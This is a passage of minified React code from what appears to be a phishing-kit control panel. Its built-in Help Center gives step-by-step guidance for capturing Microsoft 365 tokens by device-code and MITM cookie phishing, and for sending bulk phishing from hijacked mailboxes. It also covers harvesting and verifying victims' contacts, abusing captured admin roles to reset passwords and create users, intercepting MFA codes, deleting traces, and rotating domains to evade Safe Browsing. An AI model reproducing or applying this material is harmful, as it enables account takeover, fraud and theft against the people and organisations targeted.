          className: `block text-[10px] text-text-muted uppercase tracking-widest mb-1.5`,
          children: e,
        }),
      (0, R.jsx)(`input`, {
        className: `w-full bg-bg border border-border text-text px-3 py-2 text-sm focus:outline-none focus:border-border-light transition-colors placeholder:text-text-muted ${t}`,
        ...n,
      }),
    ],
  });
}
function xa({ label: e, children: t, className: n = ``, ...r }) {
  return (0, R.jsxs)(`div`, {
    className: `w-full`,
    children: [
      e &&
        (0, R.jsx)(`label`, {
          className: `block text-[10px] text-text-muted uppercase tracking-widest mb-1.5`,
          children: e,
        }),
      (0, R.jsx)(`select`, {
        className: `w-full bg-bg border border-border text-text px-3 py-2 text-sm focus:outline-none focus:border-border-light cursor-pointer ${n}`,
        ...r,
        children: t,
      }),
    ],
  });
}
function Sa({
  open: e,
  onClose: t,
  title: n,
  children: r,
  width: i = `max-w-md`,
}) {
  return e
    ? (0, R.jsx)(`div`, {
        className: `fixed inset-0 z-40 flex items-center justify-center bg-black/60`,
        onClick: t,
        children: (0, R.jsxs)(`div`, {
          className: `bg-surface border border-border ${i} w-full mx-4 animate-[fadeIn_0.15s_ease]`,
          onClick: (e) => e.stopPropagation(),
          children: [
            (0, R.jsxs)(`div`, {
              className: `flex items-center justify-between px-5 py-3 border-b border-border`,
              children: [
                (0, R.jsx)(`h3`, {
                  className: `text-sm font-bold uppercase tracking-wider`,
                  children: n,
                }),
                (0, R.jsx)(`button`, {
                  onClick: t,
                  className: `text-text-muted hover:text-text`,
                  children: (0, R.jsx)(Ki, { size: 16 }),
                }),
              ],
            }),
            (0, R.jsx)(`div`, {
              className: `p-5 overflow-y-auto max-h-[80vh]`,
              children: r,
            }),
          ],
        }),
      })
    : null;
}
async function Ca() {
  return P(`/dash/help-videos`);
}
async function wa(e) {
  return P(`/dash/help-videos`, { method: `POST`, body: JSON.stringify(e) });
}
async function Ta(e) {
  return P(`/dash/help-videos/${e}`, { method: `DELETE` });
}
async function Ea(e, t, n, r) {
  let i = new FormData();
  (i.append(`file`, e),
    i.append(`title`, t),
    i.append(`description`, n),
    i.append(`category`, r));
  let a = await fetch(`/dash/help-videos/upload`, {
    method: `POST`,
    credentials: `include`,
    body: i,
  });
  if (!a.ok) {
    let e = await a.json().catch(() => ({ error: a.statusText }));
    throw Error(e.error || `HTTP ${a.status}`);
  }
  return a.json();
}
var Da = {
    "getting-started": {
      label: `Getting Started`,
      icon: (0, R.jsx)(qi, { size: 12, className: `text-yellow-400` }),
    },
    tokens: {
      label: `Token Vault`,
      icon: (0, R.jsx)(ti, { size: 12, className: `text-yellow-400` }),
    },
    lures: {
      label: `Lures`,
      icon: (0, R.jsx)(ai, { size: 12, className: `text-green-400` }),
    },
    inbox: {
      label: `Inbox`,
      icon: (0, R.jsx)(di, { size: 12, className: `text-blue-400` }),
    },
    sender: {
      label: `B2B Sender`,
      icon: (0, R.jsx)(Si, { size: 12, className: `text-sky-400` }),
    },
    extractor: {
      label: `Email Extractor`,
      icon: (0, R.jsx)(Er, { size: 12, className: `text-purple-400` }),
    },
    admin: {
      label: `Admin Control`,
      icon: (0, R.jsx)(Ti, { size: 12, className: `text-red-400` }),
    },
    keywords: {
      label: `Keywords & Rules`,
      icon: (0, R.jsx)(Dr, { size: 12, className: `text-yellow-400` }),
    },
    domains: {
      label: `Domains`,
      icon: (0, R.jsx)($r, { size: 12, className: `text-teal-400` }),
    },
    troubleshooting: {
      label: `Troubleshooting`,
      icon: (0, R.jsx)(L, { size: 12, className: `text-orange-400` }),
    },
  },
  Oa = [
    {
      id: `overview`,
      title: `Panel Overview`,
      category: `getting-started`,
      icon: (0, R.jsx)(ii, { size: 14, className: `text-blue-400` }),
      tags: [`start`, `overview`, `dashboard`, `panel`, `how`, `what`],
      content: [
        {
          body: `The panel is your central command center. The Overview page shows a summary of all captured tokens, active lures, recent inbox activity, and send job status at a glance.`,
        },
        {
          heading: `Navigation`,
          body: `Use the sidebar on the left to navigate between sections. Each section handles a specific part of the workflow:

• Token Vault — manage captured accounts
• Lures — create and manage phishing links
• Inbox — read and manage captured mailboxes
• B2B Sender — send bulk emails from captured accounts
• Email Extractor — harvest email addresses from mailboxes
• Admin Control — manage org users from admin accounts
• Keywords — auto-forward emails matching keywords
• Domains — manage lure domains and CF workers
• Settings — account and panel settings`,
        },
      ],
    },
    {
      id: `tokens-basics`,
      title: `What are Tokens?`,
      category: `tokens`,
      icon: (0, R.jsx)(ti, { size: 14, className: `text-yellow-400` }),
      tags: [
        `token`,
        `capture`,
        `account`,
        `vault`,
        `active`,
        `expired`,
        `refresh`,
      ],
      content: [
        {
          body: `Tokens represent captured Microsoft 365 accounts. When a victim completes a device code flow or cookie capture, their access token and refresh token are saved here.`,
        },
        {
          heading: `Token Status`,
          body: `• Active — token is working and can be used for inbox access, sending, etc.
• Expired — token has expired but may be refreshable
• Revoked — the organization has revoked access; this token is dead
• Suspended — manually paused`,
        },
        {
          heading: `What You Can Do`,
          body: `From any active token you can:
• Read their inbox and sent items
• Send emails as them
• Extract contacts and email addresses
• Browse OneDrive files
• If they have admin roles — manage org users, reset passwords, create accounts`,
        },
      ],
    },
    {
      id: `tokens-refresh`,
      title: `Token Refresh & Expiry`,
      category: `tokens`,
      icon: (0, R.jsx)(yi, { size: 14, className: `text-yellow-400` }),
      tags: [`refresh`, `expire`, `revoke`, `keep alive`, `token`],
      content: [
        {
          body: `Access tokens expire every ~1 hour. The panel automatically refreshes them using the stored refresh token. This happens silently in the background.`,
        },
        {
          heading: `When Tokens Die`,
          body: `A token becomes permanently dead when:
• The user or admin changes their password
• The admin revokes all sessions
• Conditional Access policies block the token
• The refresh token expires (usually 90 days of inactivity)

Revoked tokens show as 'revoked' in the vault. There's nothing you can do to recover them — you need a new capture.`,
        },
      ],
    },
    {
      id: `lures-create`,
      title: `Creating Lures`,
      category: `lures`,
      icon: (0, R.jsx)(ai, { size: 14, className: `text-green-400` }),
      tags: [
        `lure`,
        `create`,
        `link`,
        `phishing`,
        `url`,
        `device code`,
        `cookie`,
      ],
      content: [
        {
          body: `Lures are the phishing links you send to targets. Each lure has a unique URL and a flow type that determines how the capture works.`,
        },
        {
          heading: `Flow Types`,
          body: `• Device Code — victim sees a Microsoft login page and enters a device code. Quick, works well for mass campaigns.
• Cookies — victim goes through a real Microsoft login (MITM). Captures session cookies including MFA-passed sessions.
• Device then Cookies — device code first, then redirects to cookie capture for double capture.
• Cookies then Device — cookie capture first, then device code.`,
        },
        {
          heading: `Lure Design`,
          body: `Each lure can have a custom landing page design:
• SharePoint — looks like a SharePoint shared document
• OneDrive — OneDrive file sharing theme
• Voicemail — missed voicemail notification
• Direct — minimal, just a continue button

You can customize the sender name displayed on the landing page.`,
        },
      ],
    },
    {
      id: `lures-domains`,
      title: `Lure Domains & Workers`,
      category: `lures`,
      icon: (0, R.jsx)($r, { size: 14, className: `text-green-400` }),
      tags: [
        `domain`,
        `worker`,
        `cloudflare`,
        `url`,
        `lure`,
        `flagged`,
        `burned`,
      ],
      content: [
        { body: `Every lure URL needs a domain. You have several options:` },
        {
          heading: `Cloudflare Worker (Recommended)`,
          body: `The easiest option. Go to Domains → CF Worker tab and deploy a worker using your Cloudflare account. You get a free *.workers.dev URL instantly. If the URL gets flagged, use 'Rotate' to generate a new worker name.`,
        },
        {
          heading: `Linked Domain`,
          body: `Link your own domain by adding DNS A records pointing to the panel server. Go to Domains → Linked Domains → Link Domain. The modal shows you exactly which DNS records to add.`,
        },
        {
          heading: `Marketplace Domain`,
          body: `Buy a domain directly through the Marketplace tab. DNS is configured automatically and SSL is provisioned within minutes.`,
        },
      ],
    },
    {
      id: `inbox-read`,
      title: `Reading & Managing Inbox`,
      category: `inbox`,
      icon: (0, R.jsx)(di, { size: 14, className: `text-blue-400` }),
      tags: [`inbox`, `email`, `read`, `delete`, `outlook`, `mailbox`],
      content: [
        {
          body: `The Inbox page gives you Outlook-style access to any captured account's mailbox. Select a token from the dropdown to load their emails.`,
        },
        {
          heading: `Features`,
          body: `• Read emails with full HTML rendering
• View attachments
• Delete emails (useful for cleaning up traces)
• Mark as read/unread
• Search within the mailbox
• Auto-refresh for new emails`,
        },
        {
          heading: `Tips`,
          body: `• After sending phishing emails, check the inbox for bounce-backs to clean your recipient list
• Use the 'Select All' checkbox + Delete to bulk-remove emails
• The inbox polls for new messages automatically`,
        },
      ],
    },
    {
      id: `sender-basics`,
      title: `How B2B Sender Works`,
      category: `sender`,
      icon: (0, R.jsx)(Si, { size: 14, className: `text-sky-400` }),
      tags: [`sender`, `send`, `email`, `bulk`, `b2b`, `compose`, `template`],
      content: [
        {
          body: `The B2B Sender lets you send emails from captured accounts. You can send to individual addresses or bulk-send to hundreds of recipients.`,
        },
        {
          heading: `Step-by-Step`,
          body: `1. Select 'Send From' — choose a captured account to send from (use the search to filter)
2. Add recipients — type emails manually, paste a list, or upload a .txt file (one email per line)
3. Choose a template — SharePoint, OneDrive, Voicemail, or write custom HTML
4. Set your link — enter your lure URL, it auto-replaces [[link]] in the template
5. Click Send`,
        },
        {
          heading: `Parallel Sending`,
          body: `You can run multiple send jobs at the same time using different accounts. Each job shows real-time progress (sent count updates 1-by-1). The panel processes up to 10 concurrent send jobs.`,
        },
      ],
    },
    {
      id: `sender-personalization`,
      title: `Email Personalization`,
      category: `sender`,
      icon: (0, R.jsx)(Pi, { size: 14, className: `text-sky-400` }),
      tags: [
        `personalization`,
        `placeholder`,
        `name`,
        `email`,
        `company`,
        `sender`,
        `template`,
        `variable`,
      ],
      content: [
        {
          body: `Use placeholders in your email subject and body to personalize each email. This makes emails look more legitimate and improves delivery.`,
        },
        {
          heading: `Available Placeholders`,
          body: `• {{sender_name}} — the display name of the account you're sending from
• [[name]] — the recipient's name (extracted from email if available)
• [[email]] — the recipient's email address
• [[company]] — the recipient's company (from email domain)
• [[link]] — your lure URL (set in the link field)
• [[date]] — today's date`,
        },
        {
          heading: `How It Works`,
          body: `Placeholders in the subject and body are replaced for each individual recipient. For example, 'Hi [[name]]' becomes 'Hi John' for john@company.com.

The preview panel shows you exactly what the email will look like with real values from the first recipient.`,
        },
      ],
    },
    {
      id: `sender-jobs`,
      title: `Managing Send Jobs`,
      category: `sender`,
      icon: (0, R.jsx)(ri, { size: 14, className: `text-sky-400` }),
      tags: [
        `job`,
        `pause`,
        `resume`,
        `cancel`,
        `delete`,
        `progress`,
        `send`,
        `status`,
      ],
      content: [
        {
          body: `The Jobs tab shows all your send jobs with real-time status.`,
        },
        {
          heading: `Job Actions`,
          body: `• Pause — temporarily stop a running job (it remembers where it left off)
• Resume — continue a paused job from where it stopped
• Cancel — permanently stop a job
• Delete — remove a completed or cancelled job from the list`,
        },
        {
          heading: `Progress Tracking`,
          body: `Each job shows a live counter that updates with every email sent. The format is 'X / Y sent' where X is the current count and Y is the total recipients.`,
        },
      ],
    },
    {
      id: `extractor-harvest`,
      title: `Extracting Email Addresses`,
      category: `extractor`,
      icon: (0, R.jsx)(Er, { size: 14, className: `text-purple-400` }),
      tags: [`extract`, `harvest`, `email`, `contacts`, `scan`, `deep`],
      content: [
        {
          body: `The Email Extractor scans a captured account's mailbox to harvest all unique email addresses it has ever communicated with.`,
        },
        {
          heading: `What It Scans`,
          body: `The deep harvest scans:
1. Saved contacts (People API)
2. Organization directory
3. All inbox messages (no limit)
4. All sent items (no limit)

It extracts email addresses from From, To, CC, and BCC fields of every message.`,
        },
        {
          heading: `Usage`,
          body: `1. Select a token from the dropdown
2. Click 'Start Harvest'
3. Watch the live progress — it shows messages scanned and unique emails found
4. When done, use Export, Sort, or Verify`,
        },
      ],
    },
    {
      id: `extractor-sort-verify`,
      title: `Sorting & Verifying Leads`,
      category: `extractor`,
      icon: (0, R.jsx)(Ir, { size: 14, className: `text-purple-400` }),
      tags: [
        `sort`,
        `verify`,
        `office 365`,
        `godaddy`,
        `provider`,
        `live`,
        `dead`,
        `valid`,
        `classify`,
      ],
      content: [
        {
          body: `After extraction, you can classify and verify the emails to build targeted lists.`,
        },
        {
          heading: `Sort by Provider`,
          body: `Click 'Classify' to run MX record lookups on all extracted domains. This identifies:
• Office 365 accounts
• Google Workspace
• GoDaddy
• Rackspace
• Security gateways (Proofpoint, Mimecast, etc.)

After classification, filter tabs appear so you can view/export only Office 365 emails, for example.`,
        },
        {
          heading: `Verify Leads`,
          body: `Click 'Verify' to check if each email actually exists. This uses Microsoft's credential API to check if the mailbox is real.

• Live — the email exists and the mailbox is active
• Dead — the email doesn't exist (avoid sending to these)
• Throttled — Microsoft rate-limited the check, try again later

After verification, you can export only the verified live emails.`,
        },
      ],
    },
    {
      id: `admin-control`,
      title: `Using Admin Control`,
      category: `admin`,
      icon: (0, R.jsx)(Ti, { size: 14, className: `text-red-400` }),
      tags: [
        `admin`,
        `mfa`,
        `reset password`,
        `create user`,
        `org`,
        `organization`,
        `global administrator`,
      ],
      content: [
        {
          body: `Admin Control lets you take actions on the victim's organization if the captured account has admin privileges (Global Administrator, User Administrator, etc.).`,
        },
        {
          heading: `How to Use`,
          body: `1. Click 'Scan Tokens' to check all captured accounts for admin roles
2. Accounts with admin roles appear in the list with their role badges
3. Click 'Users' to view the organization's user directory
4. Click 'Create' to make a new user in their org`,
        },
        {
          heading: `Available Actions`,
          body: `• View Org Users — list all users in the organization with search
• Reset Password — generate a new password for any org user (auto-copies to clipboard)
• Enable/Disable Account — toggle a user account on/off
• Create User — create a brand new account in the organization with any domain they own`,
        },
        {
          heading: `Requirements`,
          body: `The captured token must have admin directory roles. Most captured accounts are regular users — only a few will have admin access. The scan automatically identifies which ones do.`,
        },
      ],
    },
    {
      id: `keywords-rules`,
      title: `Keyword Monitoring & Rules`,
      category: `keywords`,
      icon: (0, R.jsx)(Dr, { size: 14, className: `text-yellow-400` }),
      tags: [
        `keyword`,
        `rule`,
        `forward`,
        `auto`,
        `monitor`,
        `alert`,
        `mfa`,
        `2fa`,
        `password`,
      ],
      content: [
        {
          body: `Keywords let you automatically monitor captured mailboxes for specific content and take actions when matches are found.`,
        },
        {
          heading: `How It Works`,
          body: `1. Create a keyword rule with a search term (e.g., 'password reset', 'MFA', 'verification code')
2. Assign it to one or more tokens
3. The panel scans new incoming emails for matches every few seconds
4. When a match is found, the email can be auto-forwarded to you or flagged`,
        },
        {
          heading: `Common Use Cases`,
          body: `• Catch MFA/2FA codes — monitor for 'verification code', 'one-time password'
• Password resets — watch for 'reset your password'
• Security alerts — catch 'suspicious sign-in', 'new device'
• Business intel — monitor for specific project names or contacts`,
        },
      ],
    },
    {
      id: `domains-linked`,
      title: `Linking Your Own Domain`,
      category: `domains`,
      icon: (0, R.jsx)($r, { size: 14, className: `text-teal-400` }),
      tags: [`domain`, `link`, `dns`, `a record`, `custom`, `own`],
      content: [
        {
          body: `You can link your own domain to the panel for use with lures.`,
        },
        {
          heading: `Steps`,
          body: `1. Go to Domains → Linked Domains → Link Domain
2. Enter your domain name
3. Add the DNS records shown (A record for @ and * pointing to the panel IP)
4. Click Link Domain
5. After DNS propagates (usually 1-5 minutes), click 'Verify' on the domain
6. SSL is auto-provisioned after verification`,
        },
        {
          heading: `Cloudflare Proxy`,
          body: `If your domain is on Cloudflare, you can use the orange cloud (proxy) — the panel detects this and handles it automatically. This hides the panel IP from DNS lookups.`,
        },
      ],
    },
    {
      id: `domains-worker`,
      title: `Cloudflare Workers`,
      category: `domains`,
      icon: (0, R.jsx)(Br, { size: 14, className: `text-teal-400` }),
      tags: [
        `worker`,
        `cloudflare`,
        `rotate`,
        `flagged`,
        `deploy`,
        `cf`,
        `workers.dev`,
      ],
      content: [
        {
          body: `Cloudflare Workers give you a free *.workers.dev domain for lure URLs. This is the fastest way to get started.`,
        },
        {
          heading: `Setup`,
          body: `1. Create a free account at cloudflare.com
2. Go to your Cloudflare dashboard → get your Global API Key from Profile → API Tokens
3. In the panel, go to Domains → CF Worker → Setup
4. Enter your CF email and API key
5. The worker deploys instantly and you get a URL like abc-xyz-1234.workers.dev`,
        },
        {
          heading: `Rotating Workers`,
          body: `If your worker URL gets flagged by Safe Browsing or email filters:
1. Go to Domains → CF Worker
2. Click 'Rotate Worker'
3. A new worker with a different name is created
4. The old URL stops working — update your lures to use the new URL

This is faster than buying a new domain and keeps you operational.`,
        },
        {
          heading: `Redeploying`,
          body: `If the worker code needs updating (template changes, etc.), click 'Redeploy'. This pushes the latest code without changing the URL.`,
        },
      ],
    },
    {
      id: `domains-marketplace`,
      title: `Buying Domains (Marketplace)`,
      category: `domains`,
      icon: (0, R.jsx)(ki, { size: 14, className: `text-teal-400` }),
      tags: [`buy`, `purchase`, `marketplace`, `domain`, `credits`],
      content: [
        {
          body: `The Marketplace lets you buy domains directly from the panel. DNS and SSL are configured automatically.`,
        },
        {
          heading: `How to Buy`,
          body: `1. Go to Domains → Marketplace
2. Search for a domain name
3. If available, click 'Buy Now'
4. The domain is registered and DNS is pointed to the panel automatically
5. SSL is provisioned within a few minutes`,
        },
        {
          heading: `Credits`,
          body: `Domain purchases use your credit balance. Top up credits through the panel settings or contact the admin.`,
        },
      ],
    },
    {
      id: `ts-token-revoked`,
      title: `Token Shows 'Revoked'`,
      category: `troubleshooting`,
      icon: (0, R.jsx)(li, { size: 14, className: `text-orange-400` }),
      tags: [`revoked`, `dead`, `expired`, `not working`, `error`, `token`],
      content: [
        {
          body: `When a token shows 'revoked', the victim's organization has terminated the session.`,
        },
        {
          heading: `Common Causes`,
          body: `• The user changed their password
• An admin revoked all user sessions
• Conditional Access policy detected suspicious activity
• The refresh token expired (90 days of no use)`,
        },
        {
          heading: `Solution`,
          body: `Revoked tokens cannot be recovered. You need a fresh capture from the target. If tokens are getting revoked quickly, the org likely has security monitoring in place — be more subtle with your actions.`,
        },
      ],
    },
    {
      id: `ts-send-failing`,
      title: `Emails Not Sending`,
      category: `troubleshooting`,
      icon: (0, R.jsx)(L, { size: 14, className: `text-orange-400` }),
      tags: [
        `send`,
        `fail`,
        `stuck`,
        `processing`,
        `not sending`,
        `error`,
        `bulk`,
      ],
      content: [
        {
          body: `If send jobs are stuck or failing, check these common causes:`,
        },
        {
          heading: `Token Issue`,
          body: `The sending account's token may have expired or been revoked. Check the Token Vault — if the token shows anything other than 'active', it can't send.`,
        },
        {
          heading: `Recipient Issues`,
          body: `• Invalid email addresses cause bounces
• Use the Email Extractor's Verify feature to check recipients before sending
• Remove any obviously invalid or role-based addresses (noreply@, admin@, etc.)`,
        },
        {
          heading: `Rate Limiting`,
          body: `Microsoft limits how many emails an account can send per day (usually 10,000). If you hit the limit, the job will stall. Wait 24 hours or use a different sending account.`,
        },
        {
          heading: `Job Stuck on 'Processing'`,
          body: `If a job shows 'processing' but the count isn't moving, try:
1. Cancel the job
2. Create a new send job with the same settings
3. If the problem persists, the token may be rate-limited`,
        },
      ],
    },
    {
      id: `ts-lure-not-loading`,
      title: `Lure Page Not Loading`,
      category: `troubleshooting`,
      icon: (0, R.jsx)(Jr, { size: 14, className: `text-orange-400` }),
      tags: [`lure`, `not loading`, `blank`, `blocked`, `flagged`, `anti-bot`],
      content: [
        { body: `If a lure URL shows a blank page or redirects to Microsoft:` },
        {
          heading: `Anti-Bot Protection`,
          body: `The panel has anti-bot protection that blocks scanners, VPNs, and known security crawlers. If YOU can't see the lure, try:
• Open in a regular browser (not behind a VPN)
• Use a mobile device on cellular data
• Clear your browser cache
• Try an incognito window`,
        },
        {
          heading: `Domain Flagged`,
          body: `If the domain got flagged by Google Safe Browsing:
• The URL will show a red warning in Chrome
• Rotate your CF Worker or switch to a new domain
• Old lure URLs on the flagged domain are dead — create new ones on the new domain`,
        },
        {
          heading: `SSL Issue`,
          body: `If you see 'Connection not secure':
• For linked domains: click 'SSL' in Domains to reprovision
• For CF Workers: SSL is automatic, try redeploying
• Wait a few minutes for SSL certificates to propagate`,
        },
      ],
    },
    {
      id: `ts-domain-flagged`,
      title: `Domain Got Flagged / Burned`,
      category: `troubleshooting`,
      icon: (0, R.jsx)(L, { size: 14, className: `text-red-400` }),
      tags: [`flagged`, `burned`, `red`, `safe browsing`, `blocked`, `domain`],
      content: [
        {
          body: `When a domain gets flagged by Google Safe Browsing or Microsoft SmartScreen, it shows a red warning page to visitors.`,
        },
        {
          heading: `Immediate Steps`,
          body: `1. Stop using the flagged domain immediately
2. If using CF Worker: go to Domains → CF Worker → Rotate (instant new URL)
3. If using a linked domain: switch to a new domain
4. Update all active lures to use the new domain
5. Create new lure URLs on the clean domain`,
        },
        {
          heading: `Prevention`,
          body: `• Don't send too many emails with the same lure URL — spread across multiple lures
• Use anti-bot protection (enabled by default)
• Rotate domains proactively before they get burned
• Avoid using the domain for too long — the more traffic it gets, the higher the chance of flagging`,
        },
      ],
    },
  ],
  ka = [
    `Getting Started`,
    `Lures`,
    `Token Vault`,
    `Inbox & Email`,
    `B2B Sender`,
    `Domains`,
    `Keywords & Rules`,
    `Admin Control`,
    `Tips & Tricks`,
  ];
function Aa(e) {
  let t =
    e.match(
      /(?:youtube\.com\/watch\?v=|youtu\.be\/|youtube\.com\/embed\/)([a-zA-Z0-9_-]{11})/,
    ) || e.match(/youtube\.com\/shorts\/([a-zA-Z0-9_-]{11})/);
  return t ? t[1] : null;
}
function ja(e) {
  return /\.(mp4|webm|ogg|mov)(\?|$)/i.test(e);
}
function Ma(e) {
  return `panel_v2_learners_${e}`;
}
function Na(e) {
  return localStorage.getItem(Ma(e)) !== `0`;
}
function Pa(e, t) {
  localStorage.setItem(Ma(e), t ? `1` : `0`);
}
function Fa() {
  let e = er((e) => e.user)?.role,
    t = z((e) => e.add),
    [n, r] = (0, _.useState)(`articles`),
    [i, a] = (0, _.useState)(``),
    [o, s] = (0, _.useState)(null),
    [c, l] = (0, _.useState)([]),
    [u, d] = (0, _.useState)(!1),
    [f, p] = (0, _.useState)(!1),
    [m, h] = (0, _.useState)(null),
    [g, v] = (0, _.useState)(null);
  (0, _.useEffect)(() => {
    n === `videos` && y();
  }, [n]);
  async function y() {
    d(!0);
    try {
      l(await Ca());
    } catch {
    } finally {
      d(!1);
    }
  }
  async function b(e) {
    if (confirm(`Delete this video?`))
      try {
        (await Ta(e),
          l((t) => t.filter((t) => t.id !== e)),
          t(`Video deleted`, `success`));
      } catch {
        t(`Failed to delete`, `error`);
      }
  }
  let x = (0, _.useMemo)(() => {
      if (!i.trim()) return Oa;
      let e = i.toLowerCase();
      return Oa.filter(
        (t) =>
          t.title.toLowerCase().includes(e) ||
          t.tags.some((t) => t.includes(e)) ||
          t.content.some(
            (t) =>
              t.body.toLowerCase().includes(e) ||
              t.heading?.toLowerCase().includes(e),
          ),
      );
    }, [i]),
    S = (0, _.useMemo)(() => {
      let e = c;
      if ((g && (e = e.filter((e) => e.category === g)), i.trim())) {
        let t = i.toLowerCase();
        e = e.filter(
          (e) =>
            e.title.toLowerCase().includes(t) ||
            e.description.toLowerCase().includes(t) ||
            e.category.toLowerCase().includes(t),
        );
      }
      return e;
    }, [c, g, i]),
    C = (0, _.useMemo)(() => {
      let e = [],
        t = Object.keys(Da);
      for (let n of t) {
        let t = x.filter((e) => e.category === n);
        if (t.length > 0) {
          let r = Da[n];
          e.push({ cat: n, label: r.label, icon: r.icon, articles: t });
        }
      }
      return e;
    }, [x]);
  return (0, R.jsxs)(`div`, {
    children: [
      (0, R.jsxs)(`div`, {
        className: `flex items-center justify-between mb-5`,
        children: [
          (0, R.jsxs)(`div`, {
            children: [
              (0, R.jsx)(`h1`, {
                className: `text-lg font-bold tracking-wider uppercase`,
                children: `Help Center`,
              }),
              (0, R.jsx)(`p`, {
                className: `text-xs text-text-muted mt-1`,
                children: `Everything you need to master the panel`,
              }),
            ],
          }),
          (0, R.jsxs)(`div`, {
            className: `flex items-center gap-3 text-text-muted`,
            children: [
              (0, R.jsxs)(`span`, {
                className: `flex items-center gap-1.5 text-xs`,
                children: [
                  (0, R.jsx)(Or, { size: 14 }),
                  ` `,
                  Oa.length,
                  ` articles`,
                ],
              }),
              (0, R.jsxs)(`span`, {
                className: `flex items-center gap-1.5 text-xs`,
                children: [
                  (0, R.jsx)(Wi, { size: 14 }),
                  ` `,
                  c.length,
                  ` videos`,
                ],
              }),
            ],
          }),
        ],
      }),
      (0, R.jsxs)(`div`, {
        className: `flex items-center gap-0 border-b border-border mb-5`,
        children: [
          (0, R.jsx)(Ia, {
            active: n === `articles`,
            onClick: () => r(`articles`),
            icon: (0, R.jsx)(Or, { size: 13 }),
            label: `Getting Started`,
          }),
          (0, R.jsx)(Ia, {
            active: n === `videos`,
            onClick: () => r(`videos`),
            icon: (0, R.jsx)(gi, { size: 13 }),
            label: `Video Tutorials`,
          }),
        ],
      }),
      (0, R.jsxs)(`div`, {
        className: `relative mb-5`,
        children: [
          (0, R.jsx)(xi, {
            size: 14,
            className: `absolute left-3.5 top-1/2 -translate-y-1/2 text-text-muted`,
          }),
          (0, R.jsx)(`input`, {
            type: `text`,
            value: i,
            onChange: (e) => a(e.target.value),
            placeholder:
              n === `articles`
                ? `Search articles... (e.g. 'send email', 'rotate worker', 'token')`
                : `Search videos...`,
            className: `w-full bg-surface border border-border text-text pl-10 pr-4 py-3 text-sm focus:outline-none focus:border-border-light`,
          }),
        ],
      }),
      n === `articles` &&
        (0, R.jsx)(`div`, {
          className: `space-y-6`,
          children:
            C.length === 0
              ? (0, R.jsx)(Ra, { text: `No articles match your search.` })
              : C.map((e) =>
                  (0, R.jsxs)(
                    `div`,
                    {
                      children: [
                        (0, R.jsxs)(`div`, {
                          className: `flex items-center gap-2 mb-2 px-1`,
                          children: [
                            e.icon,
                            (0, R.jsx)(`h2`, {
                              className: `text-xs font-bold uppercase tracking-wider text-text-secondary`,
                              children: e.label,
                            }),
                            (0, R.jsxs)(`span`, {
                              className: `text-[10px] text-text-muted`,
                              children: [`(`, e.articles.length, `)`],
                            }),
                          ],
                        }),
                        (0, R.jsx)(`div`, {
                          className: `space-y-px`,
                          children: e.articles.map((e) =>
                            (0, R.jsxs)(
                              `div`,
                              {
                                className: `bg-surface border border-border`,
                                children: [
                                  (0, R.jsxs)(`button`, {
                                    onClick: () =>
                                      s((t) => (t === e.id ? null : e.id)),
                                    className: `w-full flex items-center gap-3 px-5 py-3.5 text-left cursor-pointer hover:bg-slate-50 transition-colors`,
                                    children: [
                                      (0, R.jsx)(`span`, {
                                        className: `flex-shrink-0`,
                                        children: e.icon,
                                      }),
                                      (0, R.jsx)(`span`, {
                                        className: `flex-1 text-sm font-medium text-text`,
                                        children: e.title,
                                      }),
                                      o === e.id
                                        ? (0, R.jsx)(Mr, {
                                            size: 14,
                                            className: `text-text-muted flex-shrink-0`,
                                          })
                                        : (0, R.jsx)(Nr, {
                                            size: 14,
                                            className: `text-text-muted flex-shrink-0`,
                                          }),
                                    ],
                                  }),
                                  o === e.id &&
                                    (0, R.jsx)(`div`, {
                                      className: `px-5 pb-5 pt-0 border-t border-border/50`,
                                      children: (0, R.jsx)(`div`, {
                                        className: `pl-7 space-y-4 mt-4`,
                                        children: e.content.map((e, t) =>
                                          (0, R.jsxs)(
                                            `div`,
                                            {
                                              children: [
                                                e.heading &&
                                                  (0, R.jsx)(`h4`, {
                                                    className: `text-[11px] font-bold uppercase tracking-wider text-text-secondary mb-1.5`,
                                                    children: e.heading,
                                                  }),
                                                (0, R.jsx)(`p`, {
                                                  className: `text-[12px] text-text-muted leading-relaxed whitespace-pre-line`,
                                                  children: e.body,
                                                }),
                                              ],
                                            },
                                            t,
                                          ),
                                        ),
                                      }),
                                    }),
                                ],
                              },
                              e.id,
                            ),
                          ),
                        }),
                      ],
                    },
                    e.cat,
                  ),
                ),
        }),
      n === `videos` &&
        (0, R.jsxs)(`div`, {
          children: [
            (0, R.jsxs)(`div`, {
              className: `flex items-center justify-between mb-4`,
              children: [
                (0, R.jsxs)(`div`, {
                  className: `flex flex-wrap gap-1.5`,
                  children: [
                    (0, R.jsx)(La, {
                      active: !g,
                      onClick: () => v(null),
                      label: `All`,
                    }),
                    ka.map((e) =>
                      (0, R.jsx)(
                        La,
                        {
                          active: g === e,
                          onClick: () => v(g === e ? null : e),
                          label: e,
                        },
                        e,
                      ),
                    ),
                  ],
                }),
                e === `admin` &&
                  (0, R.jsxs)(V, {
                    size: `sm`,
                    onClick: () => p(!0),
                    className: `flex items-center gap-1.5 ml-3 flex-shrink-0`,
                    children: [(0, R.jsx)(_i, { size: 12 }), ` Add Video`],
                  }),
              ],
            }),
            u
              ? (0, R.jsx)(`div`, {
                  className: `py-12 text-center text-sm text-text-muted`,
                  children: `Loading videos...`,
                })
              : S.length === 0
                ? (0, R.jsx)(Ra, {
                    text:
                      c.length === 0
                        ? `No videos yet. Admin can add tutorial videos here.`
                        : `No videos match your filter.`,
                    icon: (0, R.jsx)(Wi, { size: 24 }),
                  })
                : (0, R.jsx)(`div`, {
                    className: `grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3`,
                    children: S.map((t) =>
                      (0, R.jsx)(
                        za,
                        {
                          video: t,
                          isAdmin: e === `admin`,
                          onPlay: () => h(t),
                          onDelete: () => b(t.id),
                        },
                        t.id,
                      ),
                    ),
                  }),
          ],
        }),
      f &&
        (0, R.jsx)(Va, {
          onClose: () => p(!1),
          onAdded: (e) => {
            (l((t) => [e, ...t]), p(!1), t(`Video added`, `success`));
          },
        }),
      m && (0, R.jsx)(Ba, { video: m, onClose: () => h(null) }),
    ],
  });
}
function Ia({ active: e, onClick: t, icon: n, label: r }) {
  return (0, R.jsxs)(`button`, {
    onClick: t,
    className: `flex items-center gap-2 px-5 py-3 text-xs font-bold uppercase tracking-wider transition-colors cursor-pointer border-b-2 -mb-px ${e ? `border-slate-800 text-slate-900` : `border-transparent text-text-muted hover:text-text-secondary`}`,
    children: [n, ` `, r],
  });
}
function La({ active: e, onClick: t, label: n }) {
